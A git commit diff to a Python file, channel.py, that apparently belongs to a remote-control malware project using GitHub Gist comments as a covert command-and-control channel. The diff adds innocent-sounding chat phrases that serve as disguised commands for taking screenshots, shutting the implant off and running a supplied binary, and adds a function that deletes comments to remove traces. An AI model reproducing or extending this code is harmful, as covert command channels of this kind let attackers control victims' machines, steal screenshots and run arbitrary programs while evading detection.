ca9a3f83aaee63f4167e779ff61f6fe9d3a4ea27
M0dEx <jakub.kubik.it@protonmail.com>
2021-12-19 23:57:07 +0100

    feat: rename file to reflect class name, remove pagination, delete function

--- channel.py
+++ channel.py
@@ -1,11 +1,5 @@
-from enum import Enum
 from github import Github
 from github.GistComment import GistComment
-
-
-class Type(Enum):
-    CONTROLLER = 0
-    BOT = 1
 
 
 class Channel:
@@ -19,36 +13,47 @@ class Channel:
     LS_REQUEST = "What are you working on?"
     LS_RESPONSE = "I am currently working on something else, sorry. :("
 
-    def __init__(self, type: Type, token: str, gist: str):
-        self.type = type
+    UPLOAD_REQUEST = "Could you send me a screenshot?"
+    UPLOAD_RESPONSE = "Sure, man!"
+
+    SHUT_OFF_REQUEST = "It's time to go to sleep!"
+    SHUT_OFF_RESPONSE = "Okay, going to be now..."
+
+    BINARY_REQUEST = "Could you do me a favor and try running this?"
+    BINARY_RESPONSE = "Sure can!"
+
+    def __init__(self, token: str, gist: str):
         self.connector = Github(token)
         self.gist = self.connector.get_gist(gist)
         self.last_comment = None
 
     def check_messages(self) -> list[GistComment]:
-        comments = self.gist.get_comments()
+        comments = list(self.gist.get_comments())
 
         new_comments = []
 
-        if comments.totalCount == 0:
+        if not comments:
             return new_comments
 
         if self.last_comment is None:
-            self.last_comment = comments[comments.totalCount - 1].id
+            self.last_comment = comments[len(comments) - 1].id
 
         old_last_idx = next(
-            (
-                x
-                for x in range(comments.totalCount)
-                if comments[x].id == self.last_comment
-            ),
-            comments.totalCount - 1,
+            (x for x in range(len(comments)) if comments[x].id == self.last_comment),
+            len(comments) - 1,
         )
         new_comments.extend(comments[old_last_idx + 1 :])
-        self.last_comment = comments[comments.totalCount - 1].id
+        self.last_comment = comments[len(comments) - 1].id
 
         return new_comments
 
     def send_message(self, message: str):
         new_comment = self.gist.create_comment(message)
         self.last_comment = new_comment.id
+        return new_comment
+
+    def delete_message(self, message_id: int):
+        comment = self.gist.get_comment(message_id)
+
+        if comment:
+            comment.delete()
